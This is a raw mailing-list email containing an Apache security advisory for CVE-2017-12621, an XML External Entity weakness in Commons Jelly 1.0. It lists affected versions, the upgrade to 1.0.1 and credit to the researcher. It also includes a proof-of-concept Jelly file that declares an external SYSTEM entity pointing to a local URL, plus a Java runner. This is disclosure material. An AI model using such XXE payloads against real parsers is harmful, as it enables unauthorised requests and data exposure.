X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2423" "Wednesday" "27" "September" "2017" "09:05:46" "-0400" "Rob Tompkins" "chtompki@apache.org" "<38CA08B7-2456-4D56-AF60-BE1168ECE522@apache.org>" "74" "[oss-security] [SECURITY] CVE-2017-12621 Apache Commons Jelly connects to URL with custom doctype definitions." nil nil nil "9" "2017092713:05:46" "[oss-security] [SECURITY] CVE-2017-12621 Apache Commons Jelly connects to URL with custom doctype definitions." (number mark "U       chtompki@apa Sep 27   74/2423  " thread-indent "\"[oss-security] [SECURITY] CVE-2017-12621 Apache Commons Jelly connects to URL with custom doctype definitions.\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 27688 invoked by uid 550); 27 Sep 2017 13:21:30 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 15694 invoked from network); 27 Sep 2017 13:05:59 -0000
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:from:content-transfer-encoding:reply-to
         :mime-version:subject:date:message-id:cc:to;
        bh=0HiFdB0Y1jURZKAUi9+kstEyuW8djm2LYHDtHVlIIXg=;
        b=lt+cgYUTIY+M0mJpRio6QuKJSbm+NZnmdArU8Qmlfz9ng7zHfsl7cf0Qwz/rbnmF6l
         su884b4+e+q6xPyNec2Uk/7wGZvCkoZiY9AXAa2vi121RLy+RbDkp7td9X+NOTZKHceG
         jCJfLgkl0JCPXn1Xkihm6l+D/XzEqE/v+8IaAt2OAD8JjvHiNZs+owt+GHc9X+oKN7lW
         hRJH92wIzTEI5v38zWKSD42aDXPgBpKdaufO7vZQjaua4FSxFOwWhnOXWfu+2w4yWpC4
         SDYKN6oYzZIn3NrLj5Ht8j9X/CoSGJLM7Lh3KqLlYcbfGWUonetHK7qF8lcFpod/Ee7T
         tGzg==
X-Gm-Message-State: AHPjjUgN0FTSO07W9yr1vSrnPWgH2J3K+dJFt7I1c4NWUwDvXQsysypy
	hXZSi6ZOr1HiimZyEyYV1KM=
X-Google-Smtp-Source: AOwi7QDufyrbNO/4zSLAuKE6eJ8/cxkpFcWlXvaxxnpF8Mf/m6g0/2PpxoqW6MHJyCf9K9ucWp0s4g==
X-Received: by 10.200.27.6 with SMTP id y6mr1725689qtj.247.1506517547795;
        Wed, 27 Sep 2017 06:05:47 -0700 (PDT)
From: Rob Tompkins <chtompki@apache.org>
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable
Mime-Version: 1.0 (Mac OS X Mail 10.3 \(3273\))
Date: Wed, 27 Sep 2017 09:05:46 -0400
Message-Id: <38CA08B7-2456-4D56-AF60-BE1168ECE522@apache.org>
Cc: security@apache.org,
 "<private@commons.apache.org>" <private@commons.apache.org>
To: announce@apache.org,
 Commons Developers List <dev@commons.apache.org>,
 Commons Users List <user@commons.apache.org>,
 Luca Carettoni <luca@doyensec.com>,
 oss-security@lists.openwall.com
X-Mailer: Apple Mail (2.3273)
Subject: [oss-security] [SECURITY] CVE-2017-12621 Apache Commons Jelly connects to URL with
 custom doctype definitions.

CVE-2017-12621: Apache Commons Jelly connects to URL with custom doctype de=
finitions.

Severity: Medium

Vendor:
The Apache Software Foundation

Versions Affected:
commons-jelly-1.0 (core), namely commons-jelly-1.0.jar

Description:
During Jelly (xml) file parsing with Apache Xerces, if a custom doctype ent=
ity is declared with a =E2=80=9CSYSTEM=E2=80=9D entity with a URL and that =
entity is used in the body of the Jelly file, during parser instantiation t=
he parser will attempt to connect to said URL. This could lead to XML Exter=
nal Entity (XXE) attacks. The Open Web Application Security Project suggest=
s that the fix be https://www.owasp.org/index.php/XML_External_Entity_(XXE)=
_Prevention_Cheat_Sheet#XMLReader

Mitigation:
1.0 users should migrate to 1.0.1.

Example:

example.jelly
--------------
<?xml version=3D"1.0"?>
<!---
 Licensed to the Apache Software Foundation (ASF) under one or more
 contributor license agreements.  See the NOTICE file distributed with
 this work for additional information regarding copyright ownership.
 The ASF licenses this file to You under the Apache License, Version 2.0
 (the "License"); you may not use this file except in compliance with
 the License.  You may obtain a copy of the License at
      http://www.apache.org/licenses/LICENSE-2.0
 Unless required by applicable law or agreed to in writing, software
 distributed under the License is distributed on an "AS IS" BASIS,
 WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 See the License for the specific language governing permissions and
 limitations under the License.
-->
<!DOCTYPE r [
        <!ELEMENT r ANY >
        <!ENTITY sp SYSTEM "http://127.0.0.1:4444/">
        ]>
<r>&sp;</r>
<j:jelly trim=3D"false" xmlns:j=3D"jelly:core"
         xmlns:x=3D"jelly:xml"
         xmlns:html=3D"jelly:html">
</j:jelly>
--------------

ExampleParser.java
------------------
public class ExampleParser {
=09
	public static void main(String[] args) throws JellyException, IOException,=
=20
					NoSuchMethodException, IllegalAccessException,IllegalArgumentException=
,=20
					InvocationTargetException {
		JellyContext context =3D new JellyContext();
		context.runScript("example.jelly", null);
	}
}

Credit:
This was discovered by Luca Carettoni of Doyensec.

References:
[1] http://commons.apache.org/jelly/security-reports.html
[2] https://issues.apache.org/jira/browse/JELLY-293

